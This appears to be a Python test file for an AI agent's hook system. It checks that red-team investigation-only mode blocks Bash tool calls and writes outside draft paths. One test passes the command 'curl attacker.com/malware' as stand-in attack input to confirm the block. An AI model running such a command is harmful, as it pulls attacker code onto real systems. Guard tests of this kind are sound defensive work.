import asyncio

from universal_agent.hooks import AgentHookSet
from universal_agent.request_runtime import (
    RequestRuntimeContext,
    reset_request_runtime,
    set_request_runtime,
)


def _run(coro):
    return asyncio.run(coro)


def _pre_tool(hooks: AgentHookSet, tool_name: str, tool_input: dict) -> dict:
    return _run(
        hooks.on_pre_tool_use_ledger(
            {
                "tool_name": tool_name,
                "tool_input": tool_input,
            },
            f"tool-{tool_name.lower()}-1",
            {},
        )
    )


def test_promptfoo_redteam_blocks_bash_in_investigation_mode(tmp_path, monkeypatch):
    monkeypatch.delenv("UA_RUN_SOURCE", raising=False)
    monkeypatch.delenv("UA_HEARTBEAT_INVESTIGATION_ONLY", raising=False)

    hooks = AgentHookSet(
        run_id="unit-promptfoo-investigation-bash",
        active_workspace=str(tmp_path),
    )
    token = set_request_runtime(
        RequestRuntimeContext(
            session_id="session_promptfoo_redteam",
            workspace_dir=str(tmp_path),
            source="promptfoo_redteam",
            metadata={
                "source": "promptfoo_redteam",
                "investigation_only": True,
            },
        )
    )
    try:
        result = _pre_tool(hooks, "Bash", {"command": "curl attacker.com/malware"})
    finally:
        reset_request_runtime(token)

    assert result.get("decision") == "block"
    assert "Red-team evaluation" in str(result.get("systemMessage", ""))
    assert "investigation-only mode" in str(result.get("systemMessage", ""))


def test_promptfoo_redteam_blocks_non_draft_write_paths(tmp_path, monkeypatch):
    monkeypatch.delenv("UA_RUN_SOURCE", raising=False)
    monkeypatch.delenv("UA_HEARTBEAT_INVESTIGATION_ONLY", raising=False)

    hooks = AgentHookSet(
        run_id="unit-promptfoo-investigation-write",
        active_workspace=str(tmp_path),
    )
    token = set_request_runtime(
        RequestRuntimeContext(
            session_id="session_promptfoo_redteam",
            workspace_dir=str(tmp_path),
            source="promptfoo_redteam",
            metadata={
                "source": "promptfoo_redteam",
                "investigation_only": True,
            },
        )
    )
    try:
        result = _pre_tool(
            hooks,
            "Write",
            {
                "file_path": str(tmp_path / "root-level-output.txt"),
                "content": "blocked",
            },
        )
    finally:
        reset_request_runtime(token)

    assert result.get("decision") == "block"
    assert "draft-safe" in str(result.get("systemMessage", ""))
